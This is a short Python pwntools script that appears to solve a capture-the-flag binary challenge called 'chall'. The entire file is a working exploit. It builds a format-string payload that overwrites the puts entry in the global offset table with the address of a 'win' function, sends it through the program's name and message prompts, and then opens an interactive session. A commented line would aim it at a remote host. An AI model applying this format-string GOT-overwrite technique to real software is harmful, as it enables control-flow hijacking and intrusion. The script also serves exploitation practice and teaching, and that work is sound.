from pwn import *
elf = context.binary = ELF('./chall')

p = process('./chall')
# p = remote("IP_ADDR", PORT)

WIN_ADDR = elf.sym['win']
puts_got = elf.got['puts']

log.success(f"WIN_ADDR: {hex(WIN_ADDR)}")
log.success(f"puts@GOT: {hex(puts_got)}")

payload = fmtstr_payload(10, {puts_got: WIN_ADDR})
p.sendlineafter(b"Enter your name: ", b"rydzze")
p.sendlineafter(b"Enter your message: ", payload)
p.recvuntil(b"@@")

p.interactive()